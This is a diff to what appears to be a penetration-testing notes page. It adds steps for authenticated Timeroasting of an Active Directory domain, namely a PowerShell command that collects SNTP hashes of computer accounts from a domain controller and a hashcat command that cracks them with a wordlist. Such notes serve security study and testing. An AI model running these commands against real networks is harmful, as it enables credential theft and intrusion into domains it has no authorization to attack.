@@ -679,7 +679,22 @@ python3 timeroast.py papa.local
 
 <img width="1324" height="184" alt="image" src="https://github.com/user-attachments/assets/32c01f9d-df68-475a-8d3f-f67e90651c68" />
 
-- Authenticated is 10x faster as it reduces the 
+- Authenticated is 10x faster as it reduces the time to resolve RID. Firstly, when authenticated, we can resolve RIDs to hostnames automatically. This significantly simplifies attribution — allowing us to map each SNTP hash back to the corresponding computer account in Active Directory.
+
+```powershell
+Import-Module .\Invoke-AuthenticatedTimeRoast.ps1
+Invoke-AuthenticatedTimeRoast  -DomainController "dc01.papa.local"
+```
+
+<img width="1538" height="218" alt="image" src="https://github.com/user-attachments/assets/c5a7e7e6-5bb6-4e74-96c9-f23d3b40195a" />
+
+- Cracking it with hashcat-:
+
+```bash
+hashcat -m 31300 -a 0 -O timeroast_hashes /home/sensei/rockyou.txt --username
+```
+
+-----------------------------
 
 
 ------------------
